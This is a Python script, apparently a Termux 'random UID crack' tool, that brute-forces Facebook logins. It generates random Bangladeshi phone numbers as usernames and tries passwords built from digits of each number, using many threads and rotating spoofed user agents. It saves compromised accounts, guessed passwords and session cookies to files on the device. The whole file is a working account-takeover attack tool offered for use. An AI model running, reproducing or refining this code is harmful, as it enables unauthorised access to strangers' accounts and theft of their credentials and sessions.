import os,time
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
except:pass
user=[]
ok=[]
cp=[]
loop=0



def mygenua():
	rr = random.randint
	xz1="Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-T975) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(110,130))}.0.{str(rr(5610,5690))}.{str(rr(210,220))} Mobile Safari/537.36"
	xz2="Mozilla/5.0 (Linux; Android {str(rr(9,12))}; Redmi Note 5 Pro Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(110,130))}.0.{str(rr(5599,5699))}.{str(rr(130,140))} Mobile Safari/537.36"
	xz3="Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2251 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(110,119))}.0.{str(rr(5720,5790))}.{str(rr(190,199))} Mobile Safari/537.36"
	xz4="Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2067 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,110))}.0.{str(rr(5150,5590))}.{str(rr(190,199))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]"
	xz5="Mozilla/5.0 (Linux; U; Android {str(rr(9,13))}; en-US; vivo 1901 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(49,59))}.0.{str(rr(2950,300))}.{str(rr(100,190))} UCBrowser/{str(rr(9,13))}.0.0.{str(rr(1200,1290))} Mobile Safari/537.36"
	xyz=random.choice([xz1,xz2,xz3,xz4,xz5])
	return xyz



def rndUA():
    andv=random.randint(1,20)
    device=f"SC-{random.randint(10,1000)}{random.choice('ABCDEF')}"
    build=random.choice("JLMNOPQRS")+str(random.randint(10,100))+''.join(random.choices(string.ascii_uppercase,k=3))
    prefix=f"Dalvik/2.1.0 (Linux; U; Android {andv}; {device} Build/{build}) "
    FBBV=random.randint(222222222,599999999)
    FBAVM=random.randint(50,10000)
    suffix=f"[FBAN/FB4A;FBAV/{FBAVM}.0.0.28.115;FBBV/{FBBV};FBRV/0;FBPN/com.facebook.katana;FBLC/en_FI;FBMF/Samsung;FBBD/Samsung;FBDV/{device};FBSV/{andv};FBCA/armeabi-v8a:armeabi;FBDM/"+'{density=1.6,width=720,height=1363};FB_FW/1;]'
    return prefix+suffix




ugen =[]



for m in range(5000):
	rr = random.randint
	axa = "Mozilla/5.0 (Linux; Android {str(rr(9,13))}; SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,150))}.0.{str(rr(5650,5740))}.{str(rr(200,299))} Mobile Safari/537.36"
	axb = "Mozilla/5.0 (Linux; Android {str(rr(9,17))}; SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,250))}.0.{str(rr(5450,5740))}.{str(rr(200,399))} Mobile Safari/537.36"
	axc = "Mozilla/5.0 (Linux; Android {str(rr(7,11))}; Tab8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(110,150))}.0.{str(rr(5555,5666))}.{str(rr(200,250))} Mobile Safari/537.36"
	axd = "Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(10,15))}_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.3 Mobile/I0L6EL Safari/618.1"
	axe = "Mozilla/5.0 (Macintosh; Intel Mac OS X {str(rr(11,15))}_{str(rr(1,5))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(111,131))}.0.{str(rr(5450,5690))}.{str(rr(199,260))} Safari/537.36"
	axf = "Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(101,129))}.0.{str(rr(5660,5790))}.{str(rr(200,260))} Safari/537.36"
	axg = "Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(111,159))}.0.{str(rr(5627,5790))}.{str(rr(224,250))} Safari/537.36"
	uaa = random.choice([axa,axb,axc,axd,axe,axf,axg])
	ugen.append(uaa)






logo=('''\033[1;37m
\t\x1b[1;92m██    ██   ██   ██    ██   ██
\t\x1b[1;92m██    ██   ██   ██     ██ ██
\t\x1b[1;92m████████   ███████      ███
\t\x1b[1;92m██    ██        ██     ██ ██
\t\x1b[1;92m██    ██        ██    ██   ██
    ┌───────────────────────────────────────┐
    │ [π] AUTHOR    : MEHEDI HASAN          │
    │ [π] GITHUB    : H4X-GG                │
    │ [π] WHATSAPP  : +880198238****        │
    │ [π] TOOL TYPE : \033[1;35mFREE \033[1;32m                 │
    │ [π] VERSION   : V.X.4                 │
    └───────────────────────────────────────┘''')
def clear():
    os.system('clear')
    print(logo)
def line():
    print(56*'\033[0;36m─')
def htx_main():
    clear()
    line()
    print('\033[1;97m[\033[1;32m1\033[1;97m] RANDOM UID CRACK')
    print('\033[1;97m[\033[1;32m2\033[1;97m] CONTACT ADMIN')
    print('\033[1;97m[\033[1;32m3\033[1;97m] EXIT')
    line()
    htx=input('\033[1;93mCHOOSE : ')
    if htx in '1':
        htx_rndm()
    if htx in '2':
        os.system('xdg-open https://www.facebook.com/h4x.gg.git')
    if htx in '3':
        sys.exit('───────────────────────────────────')
    else:
    	htx_main()

def htx_rndm():
    clear()
    line()
    print('\033[1;35mEXAMPLE : 017 • 018 • 019 ')
    line()
    code=input('\033[1;93mSIM CODE : ')
  #  os.system('xdg-open https://facebook.com/groups/590005482506415/')
    line()
    print("\033[1;92mEXAMPLE : 5000 • 10000 • 20000 • 30000")
    line()
    limit=int(input('\033[1;93mCRCAK LIMIT : '))
   # os.system('xdg-open https://facebook.com/groups/1885398221816745/')
    for x in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as mehedi:
        os.system("clear")
        print(logo)
        line()
        total=str(len(user))
        for cudi in user:
            uid=code+cudi
            ak=uid[:7]
            st=uid[0:7]
            lm=uid[:6]
            hs=uid[0:6]
            pss=[uid,cudi,ak,st,lm,hs]
            mehedi.submit(h4x_cracker,uid,pss,total)
    line()
    print(f' TOTAL OK/CP : {str(len(ok))}/{str(len(cp))}')
    line()


def h4x_cracker(uid,pss,total):
    global ok
    global loop
    global cp
    try:
        for ps in pss:
            session=requests.Session()
            sys.stdout.write(f'\r\033[1;34m[H4X-XD] \033[1;97m[{loop}/{total}] \033[1;92m[OK]-{len(ok)}\r')
            sys.stdout.flush()
            ua=mygenua()
            ua2=rndUA()
            ua3=random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            pron_star={
    'authority': 'm.facebook.com',
    "method": 'GET',
    "scheme": 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
     'dpr': '2',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
     'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"vivo Y95"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"8.1.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': ua}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\033[38;5;46m[H4X-OK] {idf} | {ps}')
                open('/sdcard/H4X.OK.txt','a').write(idf+'|'+ps+'\n')
                open('/sdcard/H4X-Cookie.txt','a').write(coki+'\n')
                ok.append(idf)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
           #     print(f'\033[1;31m[H4X-CP] {idf} | {ps}')
                open('/sdcard/H4X.CP.txt','a').write(idf+'|'+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
        loop+=1
    except:
        pass


htx_main()